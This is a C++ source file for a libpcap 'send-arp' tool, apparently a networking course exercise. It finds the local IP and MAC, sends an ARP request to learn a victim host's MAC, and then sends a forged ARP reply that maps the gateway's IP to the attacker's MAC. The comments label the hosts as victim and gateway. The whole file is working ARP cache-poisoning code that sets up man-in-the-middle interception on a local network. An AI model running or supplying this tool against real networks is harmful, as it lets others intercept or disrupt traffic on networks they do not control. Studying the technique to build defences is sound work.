#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <string>
#include <cstring>
#include <iostream>
#include <iomanip>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// GET local IP
string source_IP(const char* ifname){
	int sock = socket(AF_INET, SOCK_DGRAM, 0);

	if (sock < 0) {
        perror("Failed to create socket");
        return "";
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("Failed to get IP address");
        close(sock);
		return "";
    }

    struct sockaddr_in* ip_addr = (struct sockaddr_in*)&ifr.ifr_addr;
	string ip = inet_ntoa(ip_addr->sin_addr);
    cout << "Local IP: " << ip << endl;

    close(sock);
	return ip;
}

// GET local MAC
string source_MAC(const char* ifname) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        perror("Failed to create socket");
		return "";
	}

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        close(sock);
        return "";
    }
	
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;

	char buf[18];
	snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
	mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	cout << "Local MAC: " << buf << endl;

    close(sock);
	return buf;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	int count = (argc - 2)/2;

	Ip s_IP = Ip(source_IP(dev)); 		// my IP address
	Mac s_MAC = Mac(source_MAC(dev)); 	// my MAC address


	for (int i = 0; i < count; i++){
		string sender_IP = argv[2 + 2*i];		// victim IP
		string target_IP = argv[3 + 2*i];		// gateway IP

		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); 
		packet.eth_.smac_ = Mac(s_MAC); 
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(s_MAC);
		packet.arp_.sip_ = htonl(Ip(s_IP));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender_IP));
		
		// packet send
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		} else {
			cout << "[DEBUG] Sent ARP request to " << sender_IP << endl;
		}

		Mac real_MAC;
		int try_count = 5;

		// get victim MAC
		while(try_count--){
			struct pcap_pkthdr* header_response;
			const u_char* packet_response;
			
			int response = pcap_next_ex(pcap, &header_response, &packet_response);
			if (response == 0) {
				cout << "[DEBUG] No packet captured. Retrying..." << endl;
				continue;
			}
			else if (response == PCAP_ERROR || response == PCAP_ERROR_BREAK){
				cerr << "[ERROR] pcap_next_ex failed: " << pcap_geterr(pcap) << endl;
				break;
			}

			EthHdr* ethr_res = (EthHdr*) packet_response;
			if (ntohs(ethr_res->type_) != EthHdr::Arp) {
				cout << "[DEBUG] Non-ARP packet received. Skipping." << endl;
				continue;
			}

			ArpHdr * arp_res = (ArpHdr*) (packet_response + sizeof (EthHdr));
			if (ntohs(arp_res->op_) != ArpHdr::Reply) {
				cout << "[DEBUG] Not an ARP reply. Skipping." << endl;
				continue;
			}

			cout << "[DEBUG] ARP reply received from IP " << Ip(ntohl(arp_res->sip_)) 
			<< " with MAC " << string(arp_res->smac_) << endl;

			Ip res_sender_IP = ntohl(arp_res->sip_);
			if (res_sender_IP == Ip(sender_IP)) {
				real_MAC = arp_res->smac_;
				cout << "[+] Found target MAC: " << string(real_MAC) << endl;
				break;
			}

		}

		if (try_count <= 0) {
			cerr << "[-] Failed to receive ARP reply from " << sender_IP << endl;
			continue;
		}

		EthArpPacket spoof;

		spoof.eth_.dmac_ = real_MAC;
		spoof.eth_.smac_ = Mac(s_MAC); 
		spoof.eth_.type_ = htons(EthHdr::Arp);

		spoof.arp_.hrd_ = htons(ArpHdr::ETHER);
		spoof.arp_.pro_ = htons(EthHdr::Ip4);
		spoof.arp_.hln_ = Mac::Size;
		spoof.arp_.pln_ = Ip::Size;
		spoof.arp_.op_ = htons(ArpHdr::Reply);

		spoof.arp_.smac_ = Mac(s_MAC);		 	  // my MAC
		spoof.arp_.sip_ = htonl(Ip(target_IP));   // gateway IP
		spoof.arp_.tmac_ = real_MAC;              // victim MAC
		spoof.arp_.tip_ = htonl(Ip(sender_IP));   // victim IP

		// send spoof packet
		int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&spoof), sizeof(EthArpPacket));
		if (res2 != 0) {
			fprintf(stderr, "pcap_sendpacket (spoofing) return %d error=%s\n", res2, pcap_geterr(pcap));
		} else {
			cout << "[*] Sent ARP spoofing packet to " << sender_IP << endl;
		}

	}
	pcap_close(pcap);
}
